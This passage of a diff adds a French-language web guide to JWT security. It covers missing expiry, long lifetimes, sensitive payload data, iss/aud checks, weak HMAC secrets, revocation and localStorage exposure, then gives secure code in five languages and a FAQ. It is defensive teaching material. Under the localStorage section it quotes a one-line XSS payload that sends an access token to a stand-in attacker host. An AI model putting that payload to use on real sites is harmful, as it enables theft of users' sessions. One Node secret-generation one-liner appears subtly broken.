+    <p>Un JWT sans revendication <code>exp</code> est valide pour toujours. Si le jeton est journalisé, mis en cache, divulgué dans une URL ou stocké dans une sauvegarde de base de données — il fonctionnera encore des années plus tard. Le vol de jeton devient une compromission permanente plutôt que temporaire.</p>
+    <div class="fix-label">Correction</div>
+    <p>Définissez toujours <code>exp</code>. 15 minutes pour les jetons d'accès dans les applications sensibles. Associez à un jeton de rafraîchissement pour les sessions plus longues. Votre bibliothèque doit valider <code>exp</code> par défaut — vérifiez-le dans la documentation et testez-le explicitement.</p>
+    <pre><code>from datetime import datetime, timedelta, timezone
+import jwt, uuid
+
+def creer_jeton_acces(user_id: str, secret: str) -> str:
+    maintenant = datetime.now(timezone.utc)
+    payload = {
+        "sub":  user_id,
+        "iss":  "https://auth.votreapp.com",
+        "aud":  "https://api.votreapp.com",
+        "iat":  maintenant,
+        "exp":  maintenant + timedelta(minutes=15),  # Courte durée
+        "jti":  str(uuid.uuid4()),            # ID unique pour anti-rejeu
+    }
+    return jwt.encode(payload, secret, algorithm="HS256")</code></pre>
+  </div>
+
+  <!-- VULN 4 -->
+  <div class="vuln-card">
+    <div class="vuln-card-header">
+      <div class="vuln-name">4. Expiration trop longue (> 24 heures)</div>
+      <span class="sev-badge sev-medium">Moyenne</span>
+    </div>
+    <p>Un jeton d'accès valide pendant 24 heures ou 30 jours donne à un attaquant une longue fenêtre d'exploitation après le vol. Un jeton volé qui expire dans 15 minutes devient rapidement inutile. Un jeton valide 30 jours donne à l'attaquant un mois d'accès au compte — y compris la possibilité de changer l'email, de réinitialiser le mot de passe et de verrouiller l'utilisateur légitime.</p>
+    <div class="fix-label">Correction</div>
+    <p>Utilisez des jetons d'accès à courte durée de vie (15 minutes) associés à un jeton de rafraîchissement. Le jeton de rafraîchissement peut avoir une durée de vie plus longue (7–30 jours) mais doit être stocké dans un cookie httpOnly, inaccessible à JavaScript.</p>
+  </div>
+
+  <!-- VULN 5 -->
+  <div class="vuln-card">
+    <div class="vuln-card-header">
+      <div class="vuln-name">5. Données sensibles dans la charge utile</div>
+      <span class="sev-badge sev-high">Élevée</span>
+    </div>
+    <p>J'ai vu cela dans du code de production écrit par des développeurs expérimentés : des mots de passe hachés ou non, des numéros de carte bancaire complets "parce qu'ils sont hachés de toute façon", des numéros d'identité, des clés API internes. La charge utile JWT est encodée en Base64url — elle n'est pas chiffrée. Toute personne qui obtient le jeton peut lire chaque champ sans aucune clé.</p>
+    <div class="fix-label">Correction</div>
+    <p>Stockez dans la charge utile : ID utilisateur, rôle, métadonnées de session, timestamp d'émission. Ne stockez jamais : mots de passe (même hachés), données financières, numéros d'identité, clés privées, ou toute donnée que vous ne voudriez pas voir affichée publiquement. Si vous devez transmettre des revendications chiffrées, utilisez <strong>JWE (JSON Web Encryption)</strong> — un standard différent qui fournit la confidentialité.</p>
+    <pre><code># Ce qui a sa place dans une charge utile JWT
+payload_correct = {
+    "sub":   "user_abc123",       # Identifiant utilisateur non devinable
+    "role":  "user",              # Rôle pour l'autorisation
+    "email": "alice@exemple.com", # Uniquement si nécessaire pour le jeton
+    "iat":   1749376800,
+    "exp":   1749377700,
+}
+
+# Ce qui N'A PAS sa place dans une charge utile JWT
+payload_incorrect = {
+    "sub":         "user_abc123",
+    "password":    "$2b$12$...",   # ❌ Hash de mot de passe — jamais
+    "card_number": "4242424242...",# ❌ Données financières — jamais
+    "ssn":         "123-45-6789", # ❌ Données personnelles — jamais
+    "api_key":     "sk-live-...", # ❌ Identifiants — jamais
+}</code></pre>
+  </div>
+
+  <!-- VULN 6 -->
+  <div class="vuln-card">
+    <div class="vuln-card-header">
+      <div class="vuln-name">6. Validation manquante de l'émetteur (iss) et de l'audience (aud)</div>
+      <span class="sev-badge sev-high">Élevée</span>
+    </div>
+    <p>Dans une architecture microservices où plusieurs services émettent chacun des JWT, un jeton émis par le Service A pour ses propres utilisateurs pourrait être accepté par le Service B si <code>iss</code> et <code>aud</code> ne sont pas validés. Un attaquant qui peut obtenir un jeton d'un service moins privilégié pourrait le rejouer contre un service plus privilégié.</p>
+    <div class="fix-label">Correction</div>
+    <p>Vérifiez toujours <code>iss</code> par rapport à un émetteur attendu et <code>aud</code> par rapport à l'identifiant du service actuel. La plupart des bibliothèques JWT acceptent ces paramètres de vérification.</p>
+    <pre><code># Python — vérifier explicitement l'émetteur et l'audience
+decoded = jwt.decode(
+    token,
+    CLE_SECRETE,
+    algorithms=["HS256"],
+    audience="https://api.votreapp.com",     # Doit correspondre à la revendication aud
+    issuer="https://auth.votreapp.com",      # Doit correspondre à la revendication iss
+    options={"verify_exp": True}
+)
+
+// Go — golang-jwt/jwt
+claims := jwt.MapClaims{}
+token, err := jwt.ParseWithClaims(tokenString, claims, keyFunc,
+    jwt.WithAudience("https://api.votreapp.com"),
+    jwt.WithIssuer("https://auth.votreapp.com"),
+    jwt.WithExpirationRequired(),
+)</code></pre>
+  </div>
+
+  <!-- VULN 7 -->
+  <div class="vuln-card">
+    <div class="vuln-card-header">
+      <div class="vuln-name">7. Secret HMAC faible</div>
+      <span class="sev-badge sev-high">Élevée</span>
+    </div>
+    <p>HS256 nécessite un secret d'au moins 256 bits (32 octets) pour atteindre son niveau de sécurité prévu. Les secrets courts, les mots du dictionnaire ou les secrets réutilisés d'autres systèmes peuvent être forcés par brute-force hors ligne — un attaquant qui capture un jeton peut tenter de forger des signatures sans jamais toucher votre serveur. Secrets courants que j'ai vus dans de vraies bases de code : <code>"secret"</code>, <code>"jwt_secret"</code>, <code>"password"</code>, <code>"1234567890123456"</code>.</p>
+    <div class="fix-label">Correction</div>
+    <pre><code># Générer un secret HS256 cryptographiquement fort
+python3 -c "import secrets; print(secrets.token_hex(32))"
+# Sortie : une chaîne hex de 64 caractères (256 bits d'entropie)
+
+# Node.js
+node -e "require('crypto').randomBytes(32).toString('hex')|0" 
+# Ou : crypto.randomBytes(32).toString('base64')
+
+# Stocker dans une variable d'environnement — jamais en dur dans le code source
+CLE_SECRETE = os.environ["JWT_SECRET"]  # Pas "ma_cle_secrete_jwt"</code></pre>
+  </div>
+
+  <!-- VULN 8 -->
+  <div class="vuln-card">
+    <div class="vuln-card-header">
+      <div class="vuln-name">8. Pas de mécanisme de révocation (jti manquant)</div>
+      <span class="sev-badge sev-medium">Moyenne</span>
+    </div>
+    <p>Les JWT sont sans état par conception — le serveur ne les stocke pas, donc il ne peut pas les révoquer. Si un utilisateur se déconnecte, change son mot de passe, ou si vous détectez un compte compromis, les jetons existants restent valides jusqu'à leur expiration. Pour un jeton de 15 minutes, c'est acceptable. Pour un jeton de 24 heures, cela signifie qu'un attaquant qui a volé un jeton avant un changement de mot de passe a encore accès jusqu'à 24 heures après.</p>
+    <div class="fix-label">Correction</div>
+    <p>Utilisez des jetons d'accès à courte durée de vie pour minimiser la fenêtre de révocation. Pour les scénarios nécessitant une révocation immédiate, maintenez une liste noire côté serveur des valeurs <code>jti</code>. Un SET Redis avec le TTL d'expiration du jeton est l'implémentation la plus courante.</p>
+    <pre><code># Liste noire JWT basée sur Redis
+import redis
+r = redis.Redis()
+
+def revoquer_jeton(jti: str, exp: int) -> None:
+    """Ajouter l'ID du jeton à la liste noire jusqu'à son expiration."""
+    ttl = exp - int(time.time())
+    if ttl > 0:
+        r.setex(f"revoked:{jti}", ttl, "1")
+
+def est_jeton_revoque(jti: str) -> bool:
+    return r.exists(f"revoked:{jti}") > 0
+
+# Dans votre middleware
+decoded = jwt.decode(token, key, algorithms=["HS256"], ...)
+if est_jeton_revoque(decoded.get("jti")):
+    raise AuthenticationError("Le jeton a été révoqué")</code></pre>
+  </div>
+
+  <!-- VULN 9 -->
+  <div class="vuln-card">
+    <div class="vuln-card-header">
+      <div class="vuln-name">9. Jeton stocké dans localStorage (exposition XSS)</div>
+      <span class="sev-badge sev-high">Élevée</span>
+    </div>
+    <p>localStorage est accessible à tout JavaScript s'exécutant sur votre page — y compris les scripts injectés via XSS, les bibliothèques tierces compromises et les extensions de navigateur. Une seule vulnérabilité XSS n'importe où sur votre site devient un vol complet de jetons. L'attaque est simple :</p>
+    <pre><code>// Charge XSS : une ligne pour voler tous les jetons stockés
+fetch('https://attaquant.com/voler?t=' + localStorage.getItem('access_token'))</code></pre>
+    <div class="fix-label">Correction</div>
+    <p>Conservez les jetons d'accès en mémoire (une variable JavaScript). Utilisez un cookie httpOnly, Secure, SameSite=Strict pour le jeton de rafraîchissement. Les cookies httpOnly sont invisibles pour JavaScript — XSS ne peut pas les lire. Voir le tableau de comparaison de stockage ci-dessous pour l'analyse complète.</p>
+  </div>
+
+  <!-- ══════════════════════════════════
+       SECTION 5 — IMPLEMENTATION
+  ══════════════════════════════════ -->
+  <h2 id="implementation">Implémentation sécurisée en 5 langages</h2>
+
+  <p>Chaque extrait montre le modèle sécurisé complet : création du jeton avec toutes les revendications recommandées, vérification du jeton avec algorithme et audience explicites, et gestion des erreurs. Ce sont des points de départ — adaptez la gestion des secrets à votre infrastructure (variables d'environnement, AWS Secrets Manager, HashiCorp Vault).</p>
+
+  <div class="lang-tabs">
+    <button class="lang-tab active" onclick="switchLang('python')">Python</button>
+    <button class="lang-tab" onclick="switchLang('node')">Node.js</button>
+    <button class="lang-tab" onclick="switchLang('go')">Go</button>
+    <button class="lang-tab" onclick="switchLang('java')">Java</button>
+    <button class="lang-tab" onclick="switchLang('php')">PHP</button>
+  </div>
+
+  <div class="code-block visible" id="lang-python">
+    <pre><code># pip install PyJWT cryptography
+import jwt, uuid, os
+from datetime import datetime, timedelta, timezone
+
+CLE_SECRETE = os.environ["JWT_SECRET"]  # Min 256 bits (32 octets)
+EMETTEUR    = "https://auth.votreapp.com"
+AUDIENCE    = "https://api.votreapp.com"
+
+# ── Créer un jeton d'accès ────────────────────────────────────
+def creer_jeton_acces(user_id: str, role: str = "user") -> str:
+    maintenant = datetime.now(timezone.utc)
+    return jwt.encode({
+        "sub": user_id,
+        "role": role,
+        "iss": EMETTEUR,
+        "aud": AUDIENCE,
+        "iat": maintenant,
+        "exp": maintenant + timedelta(minutes=15),
+        "jti": str(uuid.uuid4()),  # ID unique pour révocation
+    }, CLE_SECRETE, algorithm="HS256")
+
+# ── Créer un jeton de rafraîchissement (longue durée, revendications minimales) ──
+def creer_jeton_rafraichissement(user_id: str, session_id: str) -> str:
+    maintenant = datetime.now(timezone.utc)
+    return jwt.encode({
+        "sub": user_id,
+        "session_id": session_id,  # Lié à la session côté serveur
+        "iss": EMETTEUR,
+        "aud": AUDIENCE,
+        "iat": maintenant,
+        "exp": maintenant + timedelta(days=7),
+        "jti": str(uuid.uuid4()),
+    }, CLE_SECRETE, algorithm="HS256")
+
+# ── Vérifier un jeton ─────────────────────────────────────────
+def verifier_jeton(token: str) -> dict:
+    try:
+        return jwt.decode(
+            token, CLE_SECRETE,
+            algorithms=["HS256"],          # Liste explicite — jamais ["HS256", "none"]
+            audience=AUDIENCE,             # Valider l'audience
+            issuer=EMETTEUR,               # Valider l'émetteur
+            options={
+                "verify_exp": True,        # Toujours vérifier l'expiration
+                "verify_iss": True,
+                "verify_aud": True,
+                "require": ["sub", "exp", "iat", "jti"]  # Revendications requises
+            }
+        )
+    except jwt.ExpiredSignatureError:
+        raise AuthenticationError("Le jeton a expiré")
+    except jwt.InvalidTokenError as e:
+        raise AuthenticationError(f"Jeton invalide : {e}")</code></pre>
+  </div>
+
+  <div class="code-block" id="lang-node">
+    <pre><code>// npm install jsonwebtoken
+const jwt  = require('jsonwebtoken');
+const { v4: uuidv4 } = require('uuid');
+
+const CLE_SECRETE = process.env.JWT_SECRET;
+const EMETTEUR    = 'https://auth.votreapp.com';
+const AUDIENCE    = 'https://api.votreapp.com';
+
+// ── Créer un jeton d'accès ───────────────────────────────────
+function creerJetonAcces(userId, role = 'user') {
+  return jwt.sign(
+    {
+      sub:  userId,
+      role: role,
+      jti:  uuidv4(),
+    },
+    CLE_SECRETE,
+    {
+      algorithm: 'HS256',
+      expiresIn: '15m',
+      issuer:    EMETTEUR,
+      audience:  AUDIENCE,
+    }
+  );
+}
+
+// ── Pour RS256 (recommandé pour les microservices) ───────────
+const fs = require('fs');
+const CLE_PRIVEE = fs.readFileSync('./cles/privee.pem');
+const CLE_PUBLIQUE  = fs.readFileSync('./cles/publique.pem');
+
+function creerJetonAccesRS256(userId, role = 'user') {
+  return jwt.sign(
+    { sub: userId, role, jti: uuidv4() },
+    CLE_PRIVEE,
+    { algorithm: 'RS256', expiresIn: '15m', issuer: EMETTEUR, audience: AUDIENCE }
+  );
+}
+
+// ── Vérifier un jeton ────────────────────────────────────────
+function verifierJeton(token) {
+  try {
+    return jwt.verify(token, CLE_SECRETE, {
+      algorithms: ['HS256'],  // Ne jamais accepter RS256 ici (attaque de confusion)
+      issuer:     EMETTEUR,
+      audience:   AUDIENCE,
+      clockTolerance: 30,     // Tolérance de décalage d'horloge de 30 secondes
+    });
+  } catch (err) {
+    if (err.name === 'TokenExpiredError') throw new Error('Jeton expiré');
+    if (err.name === 'JsonWebTokenError') throw new Error(`Jeton invalide : ${err.message}`);
+    throw err;
+  }
+}
+
+// ── Middleware Express.js ────────────────────────────────────
+function authentifier(req, res, next) {
+  const authHeader = req.headers.authorization;
+  if (!authHeader?.startsWith('Bearer ')) {
+    return res.status(401).json({ error: 'En-tête Authorization manquant' });
+  }
+  const token = authHeader.slice(7);
+  try {
+    req.user = verifierJeton(token);
+    next();
+  } catch (err) {
+    res.status(401).json({ error: err.message });
+  }
+}</code></pre>
+  </div>
+
+  <div class="code-block" id="lang-go">
+    <pre><code>// go get github.com/golang-jwt/jwt/v5
+package auth
+
+import (
+    "errors"
+    "os"
+    "time"
+
+    "github.com/golang-jwt/jwt/v5"
+    "github.com/google/uuid"
+)
+
+var (
+    cleSecrete = []byte(os.Getenv("JWT_SECRET"))
+    emetteur   = "https://auth.votreapp.com"
+    audience   = "https://api.votreapp.com"
+)
+
+type Revendications struct {
+    Role string `json:"role"`
+    jwt.RegisteredClaims
+}
+
+// CreerJetonAcces crée un jeton d'accès à courte durée de vie
+func CreerJetonAcces(userID, role string) (string, error) {
+    maintenant := time.Now()
+    revendications := Revendications{
+        Role: role,
+        RegisteredClaims: jwt.RegisteredClaims{
+            Subject:   userID,
+            Issuer:    emetteur,
+            Audience:  jwt.ClaimStrings{audience},
+            IssuedAt:  jwt.NewNumericDate(maintenant),
+            ExpiresAt: jwt.NewNumericDate(maintenant.Add(15 * time.Minute)),
+            ID:        uuid.New().String(), // jti
+        },
+    }
+    jeton := jwt.NewWithClaims(jwt.SigningMethodHS256, revendications)
+    return jeton.SignedString(cleSecrete)
+}
+
+// VerifierJeton analyse et valide un jeton JWT
+func VerifierJeton(jetonString string) (*Revendications, error) {
+    jeton, err := jwt.ParseWithClaims(
+        jetonString,
+        &Revendications{},
+        func(jeton *jwt.Token) (interface{}, error) {
+            // Vérifier la méthode de signature — empêcher la confusion d'algorithme
+            if _, ok := jeton.Method.(*jwt.SigningMethodHMAC); !ok {
+                return nil, errors.New("méthode de signature inattendue")
+            }
+            return cleSecrete, nil
+        },
+        jwt.WithAudience(audience),
+        jwt.WithIssuer(emetteur),
+        jwt.WithExpirationRequired(),
+        jwt.WithIssuedAt(),
+    )
+    if err != nil {
+        return nil, err
+    }
+    revendications, ok := jeton.Claims.(*Revendications)
+    if !ok {
+        return nil, errors.New("revendications invalides")
+    }
+    return revendications, nil
+}</code></pre>
+  </div>
+
+  <div class="code-block" id="lang-java">
+    <pre><code>// Maven : io.jsonwebtoken:jjwt-api:0.12.6 + jjwt-impl + jjwt-jackson
+import io.jsonwebtoken.*;
+import io.jsonwebtoken.security.Keys;
+import javax.crypto.SecretKey;
+import java.time.*;
+import java.util.UUID;
+
+public class JwtService {
+    private final SecretKey cle;
+    private final String emetteur = "https://auth.votreapp.com";
+    private final String audience = "https://api.votreapp.com";
+
+    public JwtService() {
+        // Charger depuis l'environnement — minimum 256 bits pour HS256
+        String secret = System.getenv("JWT_SECRET");
+        this.cle = Keys.hmacShaKeyFor(secret.getBytes());
+    }
+
+    // ── Créer un jeton d'accès ────────────────────────────────
+    public String creerJetonAcces(String userId, String role) {
+        Instant maintenant = Instant.now();
+        return Jwts.builder()
+            .subject(userId)
+            .claim("role", role)
+            .issuer(emetteur)
+            .audience().add(audience).and()
+            .issuedAt(Date.from(maintenant))
+            .expiration(Date.from(maintenant.plus(15, ChronoUnit.MINUTES)))
+            .id(UUID.randomUUID().toString())   // jti
+            .signWith(cle, Jwts.SIG.HS256)      // Algorithme explicite
+            .compact();
+    }
+
+    // ── Vérifier un jeton ────────────────────────────────────
+    public Claims verifierJeton(String jeton) {
+        try {
+            return Jwts.parser()
+                .verifyWith(cle)
+                .requireIssuer(emetteur)
+                .requireAudience(audience)
+                .build()
+                .parseSignedClaims(jeton)
+                .getPayload();
+        } catch (ExpiredJwtException e) {
+            throw new AuthenticationException("Jeton expiré");
+        } catch (JwtException e) {
+            throw new AuthenticationException("Jeton invalide : " + e.getMessage());
+        }
+    }
+}</code></pre>
+  </div>
+
+  <div class="code-block" id="lang-php">
+    <pre><code>&lt;?php
+// composer require firebase/php-jwt
+use Firebase\JWT\JWT;
+use Firebase\JWT\Key;
+use Firebase\JWT\ExpiredException;
+use Firebase\JWT\SignatureInvalidException;
+
+class JwtService {
+    private string $cleSecrete;
+    private string $emetteur = 'https://auth.votreapp.com';
+    private string $audience = 'https://api.votreapp.com';
+    private string $algo     = 'HS256';
+
+    public function __construct() {
+        $this->cleSecrete = getenv('JWT_SECRET') ?: die('JWT_SECRET non défini');
+    }
+
+    // ── Créer un jeton d'accès ────────────────────────────────
+    public function creerJetonAcces(string $userId, string $role = 'user'): string {
+        $maintenant = time();
+        $payload = [
+            'sub'  => $userId,
+            'role' => $role,
+            'iss'  => $this->emetteur,
+            'aud'  => $this->audience,
+            'iat'  => $maintenant,
+            'exp'  => $maintenant + 900,    // 15 minutes
+            'nbf'  => $maintenant,
+            'jti'  => bin2hex(random_bytes(16)),  // Aléatoire cryptographique
+        ];
+        return JWT::encode($payload, $this->cleSecrete, $this->algo);
+    }
+
+    // ── Vérifier un jeton ────────────────────────────────────
+    public function verifierJeton(string $jeton): object {
+        try {
+            $decode = JWT::decode(
+                $jeton,
+                new Key($this->cleSecrete, $this->algo)
+            );
+            // firebase/php-jwt ne vérifie pas iss/aud par défaut
+            if ($decode->iss !== $this->emetteur) {
+                throw new \Exception('Émetteur invalide');
+            }
+            if ($decode->aud !== $this->audience) {
+                throw new \Exception('Audience invalide');
+            }
+            return $decode;
+        } catch (ExpiredException $e) {
+            throw new AuthenticationException('Le jeton a expiré');
+        } catch (SignatureInvalidException $e) {
+            throw new AuthenticationException('Signature invalide');
+        } catch (\Exception $e) {
+            throw new AuthenticationException('Jeton invalide : ' . $e->getMessage());
+        }
+    }
+}
+?&gt;</code></pre>
+  </div>
+
+  <!-- ══════════════════════════════════
+       SECTION 6 — TOKEN PATTERN
+  ══════════════════════════════════ -->
+  <h2 id="token-pattern">Le modèle correct jeton d'accès + jeton de rafraîchissement</h2>
+
+  <p>L'objectif de sécurité est de garder le jeton d'accès suffisamment éphémère pour que son vol n'ait pas d'importance, tout en offrant aux utilisateurs une session qui ne nécessite pas de réauthentification toutes les 15 minutes. La solution sur laquelle l'industrie a convergé — utilisée par Google, GitHub et Stripe — est la paire jeton d'accès + jeton de rafraîchissement avec rotation.</p>
+
+  <div class="seq-diagram" aria-label="Diagramme de séquence des jetons d'accès et de rafraîchissement">
+    <div class="seq-step"><span class="seq-actor">Utilisateur</span> <span class="seq-arrow">→→</span> <span class="seq-label">POST /auth/login {identifiant, mot_de_passe}</span></div>
+    <div class="seq-step"><span class="seq-actor">Serveur</span> <span class="seq-arrow">→→</span> <span class="seq-label">access_token (15 min, dans le corps de la réponse) + refresh_token (7 jours, cookie httpOnly)</span></div>
+    <div class="seq-comment">  # Le client stocke access_token en mémoire (variable JS), jamais dans localStorage</div>
+
+    <div class="seq-step"><span class="seq-actor">Utilisateur</span> <span class="seq-arrow">→→</span> <span class="seq-label">GET /api/data  Authorization: Bearer &lt;access_token&gt;</span></div>
+    <div class="seq-step"><span class="seq-actor">Serveur</span> <span class="seq-arrow">→→</span> <span class="seq-label">200 OK {data}</span></div>
+    <div class="seq-comment">  # access_token expire après 15 min</div>
+
+    <div class="seq-step"><span class="seq-actor">Utilisateur</span> <span class="seq-arrow">→→</span> <span class="seq-label">POST /auth/refresh  (refresh_token envoyé automatiquement via cookie httpOnly)</span></div>
+    <div class="seq-step"><span class="seq-actor">Serveur</span> <span class="seq-arrow">→→</span> <span class="seq-label">nouvel access_token (15 min) + NOUVEAU refresh_token (invalide l'ancien) ← ROTATION</span></div>
+    <div class="seq-comment">  # L'ancien refresh_token est immédiatement invalidé dans la base de données</div>
+
+    <div class="seq-step"><span class="seq-actor">Utilisateur</span> <span class="seq-arrow">→→</span> <span class="seq-label">POST /auth/logout</span></div>
+    <div class="seq-step"><span class="seq-actor">Serveur</span> <span class="seq-arrow">→→</span> <span class="seq-label">Invalide le refresh_token en base + supprime le cookie + ajoute le jti de l'access_token à la liste noire</span></div>
+  </div>
+
+  <p>La rotation est ce qui rend le vol détectable. Lorsqu'un utilisateur légitime essaie d'utiliser son jeton de rafraîchissement après qu'un attaquant l'a déjà utilisé (parce que la rotation a émis un nouveau jeton à l'attaquant), le jeton de l'utilisateur légitime est déjà invalidé. Le serveur détecte une tentative de rejeu sur un jeton de rafraîchissement révoqué et peut immédiatement invalider toute la famille de sessions.</p>
+
+  <pre><code># Rotation des jetons de rafraîchissement côté serveur (Python + Redis)
+import redis, secrets
+r = redis.Redis()
+
+def rotation_jeton_rafraichissement(ancien_jeton: str, user_id: str) -> dict:
+    """
+    Valide l'ancien jeton de rafraîchissement, émet un nouveau, invalide l'ancien.
+    Si l'ancien jeton est déjà révoqué, vol potentiel de jeton détecté.
+    """
+    cle_jeton = f"refresh:{user_id}:{ancien_jeton}"
+
+    # Vérifier si le jeton existe et est valide
+    if not r.exists(cle_jeton):
+        # Ancien jeton déjà utilisé ou révoqué — vol potentiel de jeton
+        # Invalider TOUS les jetons de rafraîchissement pour cet utilisateur par sécurité
+        r.delete(*r.keys(f"refresh:{user_id}:*"))
+        raise SecurityError("Réutilisation de jeton détectée — session invalidée")
+
+    # Révoquer l'ancien jeton immédiatement
+    r.delete(cle_jeton)
+
+    # Émettre un nouveau jeton de rafraîchissement
+    nouveau_jeton = secrets.token_urlsafe(32)
+    r.setex(f"refresh:{user_id}:{nouveau_jeton}", 604800, "valid")  # TTL de 7 jours
+
+    return {
+        "access_token":  creer_jeton_acces(user_id),
+        "refresh_token": nouveau_jeton  # Envoyer dans un cookie httpOnly
+    }</code></pre>
+
+  <!-- ══════════════════════════════════
+       SECTION 7 — STORAGE
+  ══════════════════════════════════ -->
+  <h2 id="storage">Stockage des jetons : la comparaison complète</h2>
+
+  <p>C'est la question qu'on me pose le plus souvent sur les JWT. La réponse courte : <strong>jamais localStorage, cookie httpOnly pour les jetons de rafraîchissement, mémoire pour les jetons d'accès</strong>. La réponse longue est ci-dessous.</p>
+
+  <div class="storage-row">
+    <div class="storage-cell header">Stockage</div>
+    <div class="storage-cell header">Résistant XSS</div>
+    <div class="storage-cell header">Résistant CSRF</div>
+    <div class="storage-cell header">Recommandation</div>
+  </div>
+  <div class="storage-row">
+    <div class="storage-cell name">localStorage</div>
+    <div class="storage-cell"><span class="bad">❌ Non</span> — tout JS sur la page peut le lire</div>
+    <div class="storage-cell"><span class="ok">✅ Oui</span> — pas envoyé automatiquement</div>
+    <div class="storage-cell"><span class="bad">Jamais pour des jetons</span></div>
+  </div>
+  <div class="storage-row">
+    <div class="storage-cell name">sessionStorage</div>
+    <div class="storage-cell"><span class="bad">❌ Non</span> — même exposition XSS que localStorage</div>
+    <div class="storage-cell"><span class="ok">✅ Oui</span></div>
+    <div class="storage-cell"><span class="bad">Jamais pour des jetons</span></div>
+  </div>
+  <div class="storage-row">
+    <div class="storage-cell name">Cookie httpOnly</div>
+    <div class="storage-cell"><span class="ok">✅ Oui</span> — JS ne peut pas le lire</div>
+    <div class="storage-cell"><span class="warn-text">⚠️ Non*</span> — envoyé automatiquement avec les requêtes</div>
+    <div class="storage-cell"><span class="ok">Pour les jetons de rafraîchissement</span> + ajouter un jeton CSRF</div>
+  </div>
+  <div class="storage-row">
+    <div class="storage-cell name">Mémoire (var JS)</div>
+    <div class="storage-cell"><span class="ok">✅ Oui</span> — effacée au rechargement</div>
+    <div class="storage-cell"><span class="ok">✅ Oui</span> — doit être attachée manuellement</div>
+    <div class="storage-cell"><span class="ok">Idéal pour les jetons d'accès</span></div>
+  </div>
+  <div class="storage-row">
+    <div class="storage-cell name">Service Worker</div>
+    <div class="storage-cell"><span class="ok">✅ Oui</span></div>
+    <div class="storage-cell"><span class="ok">✅ Oui</span></div>
+    <div class="storage-cell"><span class="warn-text">Avancé</span> — complexe mais excellent</div>
+  </div>
+
+  <p>Le <code>*</code> à côté de la résistance CSRF pour les cookies httpOnly : les attaques CSRF fonctionnent en trompant un navigateur pour qu'il envoie une requête avec les cookies de la victime. Atténuez cela avec <code>SameSite=Strict</code> (ou <code>Lax</code>) et un jeton CSRF dans un en-tête personnalisé. La combinaison <code>httpOnly; Secure; SameSite=Strict</code> offre une bonne protection à la fois contre XSS et CSRF pour le jeton de rafraîchissement.</p>
+
+  <pre><code># Définir correctement le cookie du jeton de rafraîchissement (exemple Python/Flask)
+from flask import make_response
+
+response = make_response({"access_token": access_token})
+response.set_cookie(
+    "refresh_token",
+    value=refresh_token,
+    httponly=True,       # Non accessible à JavaScript
+    secure=True,         # HTTPS uniquement
+    samesite="Strict",   # Pas envoyé lors de requêtes inter-sites (atténuation CSRF)
+    max_age=604800,      # 7 jours
+    path="/auth/refresh" # Envoyé uniquement au point de rafraîchissement, pas partout
+)
+return response</code></pre>
+
+  <div style="text-align:center;margin:32px 0">
+    <a href="/fr/outils/decodeur-jwt/" class="btn-cta">🔍 Analysez votre JWT — note de sécurité, détection de vulnérabilités, gratuit</a>
+  </div>
+
+  <!-- ══════════════════════════════════
+       SECTION 8 — FAQ
+  ══════════════════════════════════ -->
+  <h2 id="faq">Foire aux questions</h2>
+
+  <div>
+    <details class="faq-item" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
+      <summary itemprop="name">Qu'est-ce que la vulnérabilité "alg:none" dans JWT ?</summary>
+      <div class="faq-answer" itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
+        <p itemprop="text">Lorsqu'un JWT spécifie <code>alg: none</code> dans son en-tête, il ne comporte aucune signature. Les serveurs vulnérables qui lisent l'algorithme depuis le jeton et lui font confiance sautent entièrement la vérification. Un attaquant peut forger un jeton avec n'importe quelles revendications — y compris <code>admin: true</code> ou un ID utilisateur arbitraire — en encodant simplement son en-tête et sa charge utile en base64url sans rien signer. La correction consiste à ne jamais lire l'algorithme depuis le jeton et à maintenir une liste explicite d'algorithmes autorisés dans votre code de vérification, comme <code>algorithms=["HS256"]</code>.</p>
+      </div>
+    </details>
+
+    <details class="faq-item" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
+      <summary itemprop="name">Qu'est-ce que l'attaque de confusion d'algorithme RS256/HS256 ?</summary>
+      <div class="faq-answer" itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
+        <p itemprop="text">Si un serveur vérifie normalement les jetons avec RS256 mais accepte également HS256, un attaquant qui a obtenu la clé publique du serveur peut signer un jeton forgé en utilisant cette clé publique comme secret HMAC pour HS256. Le serveur le vérifie avec sa propre clé publique — et l'accepte, car la vérification HMAC de "clé publique comme secret" réussit lorsque la même clé a été utilisée pour signer. La correction : spécifiez une liste stricte d'algorithmes autorisés dans votre bibliothèque JWT. Si votre serveur utilise RS256, il doit rejeter inconditionnellement les jetons HS256.</p>
+      </div>
+    </details>
+
+    <details class="faq-item" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
+      <summary itemprop="name">Dois-je stocker les jetons JWT dans localStorage ou dans des cookies ?</summary>
+      <div class="faq-answer" itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
+        <p itemprop="text">Ne stockez jamais les jetons JWT dans localStorage ou sessionStorage. Tous deux sont entièrement lisibles par tout JavaScript s'exécutant sur votre page, y compris les charges XSS et les scripts tiers compromis. Pour les jetons d'accès, utilisez une variable JavaScript en mémoire — effacée au rechargement de la page. Pour les jetons de rafraîchissement, utilisez un cookie httpOnly, Secure, SameSite=Strict, invisible pour JavaScript. Ajoutez un jeton CSRF dans un en-tête personnalisé pour vous protéger contre les attaques CSRF sur le point de rafraîchissement.</p>
+      </div>
+    </details>
+
+    <details class="faq-item" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
+      <summary itemprop="name">Qu'est-ce que la rotation des jetons de rafraîchissement ?</summary>
+      <div class="faq-answer" itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
+        <p itemprop="text">La rotation des jetons de rafraîchissement consiste à émettre un tout nouveau jeton de rafraîchissement chaque fois qu'un jeton d'accès est rafraîchi, et à invalider immédiatement l'ancien. Le principal avantage de sécurité est la détection du vol de jeton : si un attaquant vole un jeton de rafraîchissement et l'utilise, le serveur émet un nouveau jeton à l'attaquant et invalide l'ancien. Lorsque l'utilisateur légitime essaie d'utiliser son jeton (maintenant révoqué), le serveur détecte une tentative de réutilisation sur un jeton invalidé et peut invalider toute la famille de sessions. Sans rotation, un jeton de rafraîchissement volé peut être utilisé indéfiniment en parallèle de l'utilisateur légitime.</p>
+      </div>
+    </details>
+
+    <details class="faq-item" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
+      <summary itemprop="name">Pourquoi ne jamais mettre de données sensibles dans la charge utile d'un JWT ?</summary>
